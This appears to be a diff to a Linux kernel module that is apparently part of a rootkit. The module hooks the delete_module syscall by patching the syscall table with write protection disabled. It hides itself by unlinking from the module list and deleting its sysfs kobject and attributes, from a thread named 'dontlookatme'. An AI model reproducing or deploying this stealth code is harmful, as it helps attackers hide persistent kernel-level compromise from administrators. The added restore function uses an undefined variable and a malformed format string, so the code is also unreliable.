@@ -6,10 +6,14 @@
 #include<linux/string.h>
 #include<linux/sysfs.h>
 #include<linux/moduleparam.h>
+#include<linux/dynamic_debug.h>
+#include<linux/kobject.h>
+#include<linux/slab.h>
 
 #include "hooking.h"
 
 static struct list_head * tmp_head;
+static struct kobject tmp_kobj;
 static int (*orig_sys_delete_module)(const char * name, int flags);
 
 static int my_delete_module(const char * name, int flags){
@@ -22,22 +26,7 @@ static int my_delete_module(const char * name, int flags){
 	return orig_sys_delete_module(name, flags);
 }
 
-//copied from module.c:1591
-static void module_remove_modinfo_attrs(struct module * mod){
-	struct module_attribute * attr;
-	int i;
-	
-	for(i = 0; (attr = &mod->modinfo_attrs[i]);i++){
-		if(!attr->attr.name)	break;
-		
-		sysfs_remove_file(&mod->mkobj.kobj, &attr->attr);
-		if(attr->free) attr->free(mod);
-	}
-	//kfree(mod->modinfo_attrs);
-}
-
 static int hiding_thread(void * data){
-	
 	mutex_lock(&module_mutex);
 	printk(KERN_INFO "Module mutex acquired, hopefully this works.\n");
 		
@@ -48,16 +37,16 @@ static int hiding_thread(void * data){
 	
 	tmp_head = THIS_MODULE->list.prev;	
 	list_del(&THIS_MODULE->list);
+		
+	tmp_kobj = THIS_MODULE->mkobj.kobj;
+	kobject_del(&THIS_MODULE->mkobj.kobj);
+	//TODO save pointers maybe?
+	THIS_MODULE->sect_attrs = NULL;
+	THIS_MODULE->notes_attrs = NULL;
 	
 	mutex_unlock(&module_mutex);
 
-	/* EXPERIMENTELL - WENN MAN DAS NUTZT, SPINNT RMMOD
-	module_remove_modinfo_attrs(THIS_MODULE);
-	((void (*) (struct module *)) module_param_sysfs_remove_T)(THIS_MODULE);
-	kobject_put(THIS_MODULE->mkobj.drivers_dir);
-	kobject_put(THIS_MODULE->holders_dir);
-	*/	
-
+	
 	return 0;
 }
 
@@ -65,8 +54,14 @@ void hide_code(void){
 	kthread_run(hiding_thread, NULL, "dontlookatme");
 }
 
+void make_module_removable(){
+	THIS_MODULE->mkobj.kobj = tmp_kobj;
+	kobject_add(&mod->mkobj.kobj, mod->mkobj.kobj.parent, "&s", mod->mkobj.kobj.name);
+}
+
 void unhide_code(void) {
 	disable_wp();
 	syscall_table[__NR_delete_module] = orig_sys_delete_module;
 	enable_wp();
 }
+
